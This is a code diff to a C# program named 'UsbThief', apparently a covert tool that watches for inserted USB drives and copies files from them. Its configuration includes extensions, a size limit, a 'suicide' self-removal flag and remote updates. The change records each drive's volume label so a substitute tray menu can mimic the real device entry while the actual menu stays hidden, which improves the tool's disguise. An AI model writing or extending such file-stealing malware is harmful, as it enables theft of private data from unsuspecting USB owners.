@@ -36,7 +36,7 @@ namespace UsbThief
         public SynchronizationContext mainThreadSynContext;
         public Status sta = Status.none;
         public Config conf = new Config { enable = false, suicide = false, ver = innerVer, update = null, exts = null, sizeLim = 100, volName = "仿生人会涮电子羊吗" };
-        public UsbDevice currentDevice = new UsbDevice { name = "none", ser = "none" };
+        public UsbDevice currentDevice = new UsbDevice { name = "none", volLabel = "none", ser = "none" };
         public enum Status
         {
             none,
@@ -58,6 +58,7 @@ namespace UsbThief
         public struct UsbDevice
         {
             public string name;
+            public string volLabel;
             public string ser;
         }
         #endregion
@@ -263,12 +264,13 @@ namespace UsbThief
                                     bool newDevice = false;
                                     Thread th = new Thread(() =>
                                     {
-                                        if (currentDevice.name == "none" && currentDevice.ser == "none" && (sta != Status.exporting || sta != Status.compressing))
+                                        if (currentDevice.name == "none" && currentDevice.volLabel == "none" && currentDevice.ser == "none" && (sta != Status.exporting || sta != Status.compressing))
                                         {
                                             string ser = GetUsbSer(drive.Name);
                                             if (ser != null)
                                             {
                                                 currentDevice.name = drive.Name;
+                                                currentDevice.volLabel = drive.VolumeLabel;
                                                 currentDevice.ser = GetUsbSer(drive.Name);
                                                 newDevice = true;
                                                 logger.Info("USB设备“" + currentDevice.ser + "”已插入");
@@ -282,7 +284,14 @@ namespace UsbThief
                                         HideRealMenu();
                                         if (!showRealMenu)
                                         {
-                                            notifyIcon1.ContextMenuStrip.Items[3].Text = " - U 盘 (" + currentDevice.name.Replace("\\", "") + ")";
+                                            if (currentDevice.volLabel != "")
+                                            {
+                                                notifyIcon1.ContextMenuStrip.Items[3].Text = " - " + currentDevice.volLabel + " (" + currentDevice.name.Replace("\\", "") + ")";
+                                            }
+                                            else
+                                            {
+                                                notifyIcon1.ContextMenuStrip.Items[3].Text = " - U 盘 (" + currentDevice.name.Replace("\\", "") + ")";
+                                            }
                                             notifyIcon1.Visible = true;
                                         }
                                         if (drive.VolumeLabel != conf.volName)
@@ -381,10 +390,11 @@ namespace UsbThief
                                     exist = true;
                                 continue;
                             }
-                            if (!exist && currentDevice.name != "none" && currentDevice.ser != "none")
+                            if (!exist && currentDevice.name != "none" && currentDevice.volLabel != "none" && currentDevice.ser != "none")
                             {
                                 logger.Info("USB设备“" + currentDevice.ser + "”已拔出");
                                 currentDevice.name = "none";
+                                currentDevice.volLabel = "none";
                                 currentDevice.ser = "none";
                                 notifyIcon1.Visible = false;
                                 HideRealMenu(true);
